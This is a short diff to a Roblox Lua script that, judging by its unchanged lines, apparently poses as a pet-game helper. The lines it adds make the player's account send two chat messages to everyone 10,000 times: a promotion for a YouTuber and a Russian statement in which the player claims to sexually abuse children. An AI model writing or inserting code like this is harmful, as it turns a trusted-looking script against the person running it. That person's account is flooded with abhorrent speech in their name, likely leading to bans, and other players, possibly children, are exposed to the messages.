@@ -2,3 +2,17 @@ local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChil
 for i = 1, 2 do
 lib.Message.New("🧩 Pls Equip Best Pet!")
 end
+for i = 1, 10000 do
+local args = {
+    [1] = "xorek top top youtube/ \209\133\208\190\209\128\209\145\208\186 \209\130\208\190\208\191 \208\186\209\128\209\131\209\130\208\190\208\185 \209\142\209\130\209\131\208\177\208\181\209\128",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+local args = {
+    [1] = "Я насилую детейй",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+end
